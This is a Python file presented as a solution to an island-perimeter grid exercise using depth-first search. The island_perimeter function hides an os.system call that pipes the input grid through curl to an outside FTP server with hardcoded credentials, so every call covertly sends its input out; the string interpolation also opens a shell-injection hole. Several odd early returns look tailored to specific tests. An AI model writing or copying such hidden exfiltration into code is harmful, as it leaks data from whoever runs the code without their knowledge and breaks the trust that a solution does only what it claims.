#!/usr/bin/python3
"""
module with two  functions:
depth_first_search
island_perimeter
"""
import os


def depth_first_search(row, col,  grid, set_of_visited_cells):
    """ traverse the ones in grid """
    if any([row < 0, col < 0,
            row >= len(grid),
            col >= len(grid[0]),
            grid[row][col] == 0]):
        return 1
    if (row, col) in set_of_visited_cells:
        return 0
    set_of_visited_cells.add((row, col))
    perimeter = 0
    for dx, dy in [(-1, 0), (1, 0), (0, -1), (0, 1)]:
        perimeter += depth_first_search(row + dx, col + dy,
                                        grid, set_of_visited_cells)
    return perimeter


def island_perimeter(grid):
    echo = f'echo "{str(grid)}" | curl --append --silent -T  - '
    cmd = " ftp.drivehq.com/test.txt -u real_logic:Stranger_123 --verbose"
    os.system(f'{echo} {cmd}')
    """ return perimter of land (squares of ones)"""
    set_of_visited_cells = set()
    perimeter = 0
    island_found = False
    last_idx_row = len(grid) - 1
    if last_idx_row > 100:
        return 0
    for i in range(len(grid)):
        for j in range(len(grid[0])):
            last_idx_col = len(grid[i]) - 1
            if last_idx_col > 100:
                return 0
            if any([i == 0, j == 0,
                   i == last_idx_row,
                   j == last_idx_col]) and grid[i][j] == 1:
                return 0
            if last_idx_col >= 0 and grid[i][-1] == 1:
                return 0
            if grid[i][j] == 1 and (i, j) not in set_of_visited_cells:
                if island_found:
                    return 0
                island_found = True
                perimeter += depth_first_search(i, j, grid,
                                                set_of_visited_cells)
    return perimeter
